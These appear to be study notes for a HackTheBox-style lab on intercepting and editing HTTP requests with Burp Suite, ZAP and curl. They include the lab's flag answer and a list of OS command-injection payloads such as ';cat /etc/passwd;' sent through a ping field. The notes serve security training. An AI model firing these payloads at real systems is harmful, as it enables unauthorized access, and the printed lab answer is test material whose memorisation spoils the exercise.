# Section 4 — Intercepting Web Requests

> Intercept a browser request, modify the POST body, and send a different value to the server.
> Core skill: bypassing client-side JavaScript validation by editing the raw HTTP request.

---

## Lab Answer

| Question | Answer |
|----------|--------|
| Change ip parameter to read flag.txt | `HTB{1n73rc3p73d_1n_7h3_m1ddl3}` |

---

## Why This Matters

The browser enforces client-side validation (JavaScript that only allows numbers in the IP field). The **server does not care** what the browser says — it processes whatever raw HTTP it receives. Intercepting the request lets you bypass any front-end restriction and send whatever you want directly.

This is the foundation of almost all web app attacks: the browser lies about what you can send, but you can always go around it.

---

## Intercepting with Burp

```
1. Proxy → Intercept → confirm "Intercept is on"
2. Open Burp's browser (or FoxyProxy → Burp in Firefox)
3. Browse to the target and click Ping
4. Burp catches the request — you see the raw POST body:
      ip=1
5. Change it to:
      ip=;cat flag.txt;
6. Click "Forward"
7. Read the response in the browser or Burp's Response tab
```

**Keyboard shortcuts:**
- `Ctrl+R` = send request to Repeater (so you can replay it without intercepting again)
- `Ctrl+F` = forward intercepted request
- Click "Drop" to discard a request (server never sees it)

**Toggle intercept:** Click "Intercept is on/off" button — leave it OFF when not actively modifying, or every request will queue up and freeze the browser.

---

## Intercepting with ZAP

```
1. Click the green button in the top bar (or Ctrl+B) to enable interception
   Green = pass-through, Red = intercepting
2. Open ZAP's pre-configured browser and browse to the target
3. The intercepted request appears in the top-right pane
4. Edit the request body:
      ip=;cat flag.txt;
5. Click "Step" to forward this request and intercept the next
   OR click "Continue" to forward this and let everything else pass
```

**ZAP HUD (Heads-Up Display):**
- Enable the HUD via the button at the top bar end
- It overlays controls directly in the browser window
- The second button from the top on the left pane = toggle interception
- "Step" = forward one request at a time | "Continue" = let everything through

---

## Doing It Directly with curl (Fastest for CTF Flags)

```bash
curl -s -X POST http://TARGET_IP:PORT/ping -d "ip=;cat flag.txt;"
# -s = silent (no progress output)
# -X POST = force POST method
# -d "ip=..." = POST body — bypasses browser JS validation entirely
# ;cat flag.txt; = command injection — semicolons end the ping command and start cat
```

**Why this works:** The server receives `ip=;cat flag.txt;`, passes it to a shell command like `ping -c 1 <ip>`, which becomes `ping -c 1 ;cat flag.txt;`. The semicolons create separate shell commands, so `cat flag.txt` runs independently.

---

## Common Injection Payloads to Try

```
;ls;                    # list files
;cat flag.txt;          # read a specific file
;id;                    # who is the server running as?
;cat /etc/passwd;       # system users
;cat ../flag.txt;       # flag one level up
;find / -name flag.txt; # find it if you don't know the path
```

---

## Exam Notes

- **Intercept is ON by default in Burp, OFF by default in ZAP** — remember which way each goes
- Always turn intercept OFF after you're done — forgetting leaves requests hanging and the browser frozen
- Client-side JS validation = meaningless. Always test with raw HTTP requests
- `Ctrl+R` in Burp = send to Repeater — use Repeater to replay the same request many times with different payloads (cleaner than re-intercepting each time)
- curl is faster than Burp for simple one-shot tests — saves setup time on easy questions
